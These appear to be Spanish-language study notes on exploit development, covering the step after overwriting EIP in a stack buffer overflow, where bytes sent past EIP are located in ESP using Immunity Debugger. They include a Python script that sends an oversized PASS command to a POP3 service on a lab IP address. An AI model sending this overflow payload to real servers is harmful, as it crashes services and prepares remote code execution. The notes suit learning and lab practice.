Una vez que se ha encontrado el **offset** y se ha sobrescrito el valor del registro **EIP** en un buffer overflow, el siguiente paso es identificar en qué parte de la memoria se están representando los caracteres introducidos en el campo de entrada.

Después de sobrescribir el valor del registro EIP, cualquier carácter adicional que introduzcamos en el campo de entrada, veremos desde Immunity Debugger que en este caso particular estos estarán representados al comienzo de la **pila** (**stack**) en el registro **ESP** (**Extended Stack Pointer**). El ESP (Extended Stack Pointer) es un registro de la CPU que se utiliza para manejar la pila (stack) en un programa. La pila es una zona de memoria temporal que se utiliza para almacenar valores y **direcciones de retorno** de las funciones a medida que se van llamando en el programa.

Entonces esto lo podriamos ver al modificar el script que se hizo anteriormente  como se muestra a continuacion 

```python
#!/usr/bin/python3.11
import sys
import socket

ip = "192.168.0.2"
port = 110


offset=4655

before_eip=b"A"*offset

eip=b"B"*4

after_eip=b"C"*200

payload=before_eip+eip+after_eip

def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))

    banner = s.recv(1024)

    s.send(b"USER tumbaburras" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS" + payload + b'\r\n')


    s.close

if __name__ == '__main__':

    exploit()


```

Ahora lo ejecutamos de la siguiente manera

![[Pasted image 20240308125659.png]]

Ya ejecutado y si nos dirigmos al immuniyt debugger podemos ver que todo le que mandamos despues del EIP se almaceno el en registro ESP (en este caso las ces)

![[Pasted image 20240308125852.png]]


Lo que puedes hacer para ver el ESP mas detalladamente es dar click derecho en el registro y luego dar click en lo siguiente


![[Pasted image 20240308130841.png]]


Y aqui podrimaos ver mejor respresentado todo el ESP en este caso podemos ver todas las ces que hemos definido en el exploit

![[Pasted image 20240308131110.png]]

Asi que nuestras ces estan represntadas y comienzan justo al inicio del ESP entonces lo siguiente que tendiramos que hacer es hacer que el EIP apunte a una direccion donde se aplique un salto al ESP para que ahi ya se ejecute  lo que estuviera dentro del ESP en este caso se podria intruducir un shellcode 